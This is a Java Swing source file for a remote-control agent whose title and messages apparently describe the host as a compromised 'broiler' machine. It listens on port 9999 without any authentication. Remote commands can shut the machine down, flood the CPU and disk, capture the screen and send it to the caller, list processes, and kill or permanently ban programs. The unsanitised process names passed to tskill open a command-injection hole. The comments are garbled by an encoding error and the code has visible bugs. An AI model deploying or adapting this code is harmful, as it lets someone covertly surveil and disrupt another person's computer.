package Window;

import java.awt.Dimension;
import java.awt.Font;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.ComponentEvent;
import java.awt.event.ComponentListener;
import java.awt.image.BufferedImage;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;
import java.util.Date;
import java.util.Scanner;

import javax.imageio.ImageIO;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTextArea;
import javax.swing.JTextField;

@SuppressWarnings("serial")
public class RemoteWindow extends JFrame{
	
	JPanel mainPanel ;
	JTextArea logText ;
	JButton startButton ;
	JTextField portField ;
	JButton stopButton ;
	JScrollPane scrollPane ;
	ServerSocket server ;
	Socket socket ;
	InputStream in ;
	OutputStream out ;
	boolean flagService = true ;
	boolean tiredCPUFlag = true ;
	boolean tiredHDDFlag = true ;
	Thread cpuThread ;
	Thread hddThread ;
	ArrayList<String> banList = new ArrayList<String>() ;

	public static final int PORT = 9999 ;
	public RemoteWindow() {
		
		//---------------------------------��ӿؼ�����------------------------------------
		Font font = new Font( "΢���ź�" , 1 , 12 ) ;
		mainPanel = new JPanel() ;
		
		startButton = new JButton( "����" ) ;
		startButton.setFont(font) ;
		startButton.addActionListener( new ActionListener() {	
			@Override
			public void actionPerformed(ActionEvent e) {
				startRemote() ;
			}
		}) ;
		
		stopButton = new JButton( "ֹͣ" ) ;
		stopButton.setFont(font);
		stopButton.addActionListener( new ActionListener() {
			@Override
			public void actionPerformed(ActionEvent e) {
				stopRemote() ;
			}
		}) ;
		
		logText = new JTextArea() ;
		logText.setFont(font);
		logText.setEditable( false ) ;
		
		portField = new JTextField( PORT+"" ) ;
		portField.setFont(font);
		portField.setHorizontalAlignment(JTextField.RIGHT) ;
		
		scrollPane = new JScrollPane( logText ) ;
		scrollPane.setHorizontalScrollBarPolicy( JScrollPane.HORIZONTAL_SCROLLBAR_NEVER ) ;
		scrollPane.transferFocusUpCycle() ;
		
		mainPanel.setLayout( null ) ;
		mainPanel.add( startButton ) ;
		mainPanel.add( portField ) ;
		mainPanel.add( stopButton ) ;
		mainPanel.add( scrollPane ) ;

		//---------------------------------���ڲ��ֲ���------------------------------------
		this.add( mainPanel ) ;
		this.addComponentListener( new ComponentListener() {
			
			@Override
			public void componentShown(ComponentEvent e) {
				// TODO Auto-generated method stub
				
			}
			
			@Override
			public void componentResized(ComponentEvent e) {
				// TODO Auto-generated method stub
				autoLayout() ;
			}
			
			@Override
			public void componentMoved(ComponentEvent e) {
				// TODO Auto-generated method stub
				
			}
			
			@Override
			public void componentHidden(ComponentEvent e) {
				// TODO Auto-generated method stub
				
			}
		}) ;

		this.setDefaultCloseOperation( JFrame.EXIT_ON_CLOSE ) ;
		this.setFont(font) ;
		this.setTitle( "�����⼦Beta  V2.0" ) ;
		this.setSize( 400 , 600 ) ;
		this.setLocationRelativeTo( null ) ;
		this.setVisible( true ) ;
	}
	
	//---------------------------------ҵ�����------------------------------------
	/**
	 * �Զ���ɴ��岼��
	 */
	public void autoLayout() {
		
		scrollPane.setBounds( 5 , 5 , mainPanel.getWidth()-10 , mainPanel.getHeight()-55 ) ;
		startButton.setBounds( scrollPane.getX() , scrollPane.getHeight()+scrollPane.getY()+10 , 60 , 30) ;
		portField.setBounds( mainPanel.getWidth()/2-50 , startButton.getY() + 5 , 100 , 20) ;
		stopButton.setBounds( mainPanel.getWidth()-66 , startButton.getY() , 60 , 30 ) ;
		
		if( server == null || server.isClosed() ) {
			startButton.setEnabled( true ) ;
			stopButton.setEnabled( false ) ;
		}else {
			startButton.setEnabled( false ) ;
			stopButton.setEnabled( true ) ;
		}
	}
	
	/**
	 * ������ʾ��Ϣ
	 */
	public void showMessage( String message ) {
		JOptionPane.showMessageDialog( this , message ) ;
	}
	
	/**
	 * @Description: ��־�¼���¼
	 * @param @param info   
	 * @return void  
	 * @throws
	 * @author Gavin
	 * @date 2015��3��12��
	 */
	@SuppressWarnings("deprecation")
	public void setLog( String info ){
		String text = this.logText.getText() ;
		this.logText.setText( text + new Date().toLocaleString()+" �� " + info +"\r\n" ) ;
	}
	/**
	 * ����Զ�̼����
	 */
	public void startRemote() {
		if ( server == null || server.isClosed() ) {
			try {
				int newPort = Integer.parseInt(portField.getText()) ;
				server = new ServerSocket( newPort ) ;
				//JAVA��listen��accept�ϲ������ˣ�ֱ����accept����

				setLog( "�����������ɹ���" ) ;
				initBanList() ;
				new Thread( new Runnable() {
					@Override
					public void run() {
						// TODO Auto-generated method stub
						acceptUserInfo() ;
					}
				}).start() ;
				new Thread( new Runnable() {
					
					@Override
					public void run() {
						banApp() ; 
						try {
							Thread.sleep(1000);
						} catch (InterruptedException e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						}
					}
				}).start() ;
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
				setLog( "��������������\n  " + e.getMessage() ) ;
			}
			autoLayout() ;
		}
	}
	
	/**
	 * ֹͣԶ�̼����
	 */
	public void stopRemote () {
		if ( server != null && socket != null) {
			try {
				server.close() ;
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
				setLog("�⼦ֹͣʧ�ܣ�\n" + e.getMessage()) ;
			}
			try {
				socket.close() ;
			} catch ( IOException ioe) {
				// TODO: handle exception
				ioe.printStackTrace() ;
				setLog("�����Ͽ�ʧ�ܣ�\n" + ioe.getMessage()) ;
			}
			server = null ;
			socket = null ;
			setLog("����ֹͣ������") ;
		}else {
			try {
				server.close() ;
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
				setLog("�⼦�Ѿ�ֹͣ��\n" + e.getMessage()) ;
			}
			server = null ;
			setLog("�⼦ֹͣ��ʳ��") ;
		}
		autoLayout() ;
	}
	
	/**
	 * ���ղ������û�����
	 */
	public void acceptUserInfo() {
		setLog( "�ȴ�������" );
		try {
			socket = server.accept() ;
			flagService = true ;
			setLog( "��ӭʥ�ϣ�" ) ;
			new Thread( new Runnable() {
				@Override
				public void run() {
					while ( flagService ){
						try {
							service() ;
						} catch (IOException e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
							setLog( "�������Ӵ���\n"+e.getMessage() ) ;
						}
					}
					setLog( "�ջ�ʥּ��" ) ;
				}
			}).start() ;
			
		} catch (Exception e) {
			// TODO: handle exception
			setLog( "�����쳣��\n" + e.getMessage() ) ;
		}
	}
	
	/**
	 * ���ղ�ִ��ִ��
	 */
	@SuppressWarnings("deprecation")
	public void service() throws IOException{
		if( socket != null && !socket.isClosed() ) {
			in = socket.getInputStream() ;
			out = socket.getOutputStream() ;
			int command = in.read() ;
			setLog( "����ָ��ɹ�����ȡָ���" ) ;
			//��������������������������������������������������������������������û���������ӡ�������������������������������������������������������������������
			if ( command == 0 ){
				flagService = false ;
				setLog( "ʥ���Ѿ��Ƽݱ𹬣��Ⱥ��������" ) ;
				acceptUserInfo() ;
			}
			//�����������������������������������������������������������������������չػ�ָ�������������������������������������������������������������������
			else if ( command == 1 ) {
				setLog( "�ػ�ָ����ճɹ����ȴ��ػ���" ) ;
				Runtime runtime = Runtime.getRuntime() ;
				runtime.exec( "shutdown -s -t 30 ") ;
			}
			//��������������������������������������������������������������������ȡ���ػ�ָ�������������������������������������������������������������������
			else if ( command == 2 ) {
				setLog( "ȡ���ػ�ָ����ճɹ���ȡ���ػ���" ) ;
				Runtime runtime = Runtime.getRuntime() ;
				runtime.exec( "shutdown -a ") ;
			}
			//����������������������������������������������������������������������������ָ�������������������������������������������������������������������
			else if ( command == 3 ) {
				setLog( "�����ҵ�ָ����ճɹ�����誣����̢�Ұѣ�" ) ;
				tiredCPUFlag = true ;
				tiredHDDFlag = true ;
				cpuThread = new Thread( new Runnable() {
					@Override
					public void run() {
						// TODO Auto-generated method stub
						while ( tiredCPUFlag ) {
							Toolkit toolkit = Toolkit.getDefaultToolkit();
							toolkit.beep();
							System.out.println("\007");
						}
					}
				});
				hddThread = new Thread( new Runnable() {
					@Override
					public void run() {
						// TODO Auto-generated method stub
						byte data[] = new byte[1024*1024*10] ;
						File file = new File( "e:/bin/1" ) ;
						try{
							while ( tiredHDDFlag ){
								FileOutputStream fileOut = new FileOutputStream( file ) ;
								fileOut.write( data ) ;
								fileOut.flush() ;
								fileOut.close() ;
								file.createNewFile() ;
							}
						}catch (Exception e) {
							e.printStackTrace();
							setLog("ɾ���ļ�ʧ�ܣ��޷�����Զ�̼������");
						}
					}
				}) ;
				//����CPU
				for (int i = 0; i < 500 ; i++) {				
					cpuThread.start() ;
				}
				//����Ӳ��
				hddThread.start() ;
			}
			//����������������������������������������������������������������������������ָ�������������������������������������������������������������������
			else if ( command == 4 ) {
				setLog( "���������⼦��" ) ;
				tiredCPUFlag = false ;
				tiredHDDFlag = false ;
			}
			//�����������������������������������������������������������������������ָ������ָ�������������������������������������������������������������������
			else if ( command == 5 ) {
				//����
				Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize() ;
				BufferedImage image = null ;	
				if( command == 5 ){
					try{
						Robot robot = new Robot() ;
						Rectangle rectangle = new Rectangle( screenSize ) ;
						image = robot.createScreenCapture( rectangle ) ;
						ImageIO.write( image , "bmp" , out ) ;
						out.flush() ;
					}catch (Exception e) {
						// TODO: handle exception
						e.printStackTrace() ;
						setLog( "ͼƬ��ͼʧ�ܣ�" + e.getMessage());
					}			
				}else if ( command == 6 ) {
					setLog( "�⼦��������ֻ�ۣ�" ) ;
				}
			}
			//����������������������������������������������������������������������ȡ�����б�ָ�������������������������������������������������������������������
			else if ( command == 6 ) {
				setLog( "׼����ȡӦ���б�" ) ;
				Process process = Runtime.getRuntime().exec( "tasklist" ) ;
				in = process.getInputStream() ;
				//InputStreamReader��Reader�����࣬�����ǽ��ֽ�����InputStreamת��Ϊ�ַ���
				InputStreamReader reader = new InputStreamReader( in ) ;
				BufferedReader bufferedReader = new BufferedReader( reader ) ;
				bufferedReader.readLine() ;
				bufferedReader.readLine() ;
				int length = bufferedReader.readLine().split( " " )[0].length() ;
				byte[] data ;
				while ( true ) {
					String line = bufferedReader.readLine() ;
					
					if( line == null ) {
						data = "\r\n".getBytes() ;
						out.write(data.length) ;
						out.write(data) ;
						out.flush() ;
						break ;
					}else {
						String name = line.substring( 0 , length - 1);
						name = name.split("\\." , 2)[0] ;
						System.out.println( name );
						data = name.getBytes() ;
						out.write(data.length) ;
						out.write(data) ;
					}
				}
			}
			//��������������������������������������������������������������������ɱ���⼦����ָ�������������������������������������������������������������������
			else if ( command == 7 ) {
				byte data[] = new byte[in.read()] ;
				in.read(data) ;
				String name = new String(data) ;

				setLog("׼ɱ�� "+name+" ����") ;
				Runtime.getRuntime().exec("tskill "+name ) ;
			}
			//����������������������������������������������������������������������ֹ�⼦����ָ������ָ�������������������������������������������������������������������
			else if (command == 8 ) {
				byte data[] = new byte[ in.read() ] ;
				in.read(data) ;
				String name  = new String(data) ;
				Runtime.getRuntime().exec("tskill "+name ) ;
				setLog("׼����ֹ "+name+" ��������򿪣�") ;
				FileOutputStream fileOut = new FileOutputStream( "e:/bin/list",true);
				fileOut.write( name.getBytes() ) ;
				fileOut.write( "\r\n".getBytes() ) ;
				fileOut.close() ;
				initBanList() ;
			}
		}
	}
	//���������������������������������������������������������������������⼦�����õ�����б�ĳ�ʼ����������������������������������������������������������������������
	public void initBanList() {
		try {
			File file = new File("e:/bin/list");
			if ( !file.exists() ) {
				file.createNewFile() ;
			}
			FileInputStream fileIn = new FileInputStream( "e:/bin/list") ;
			BufferedReader reader = new BufferedReader( new InputStreamReader(in) ) ;
			while (true){
				String line = reader.readLine() ;
				if( line != null && line.equals("") ) {
					banList.add( line ) ;
				}
				
			}
		} catch (Exception e) {
			// TODO: handle exception
		}
	}
	//�������������������������������������������������������������������������⼦����򿪣�����ɱ����Щ���򣩡�������������������������������������������������������������������
	public void banApp() {
		for (int i = 0 ; i < banList.size() ; i++) {
			String name = banList.get( i ) ;
			try {
				Runtime.getRuntime().exec("tskill "+name ) ;
			} catch (Exception e) {
				// TODO: handle exception
				e.printStackTrace();
			}
		}
	}
	
}
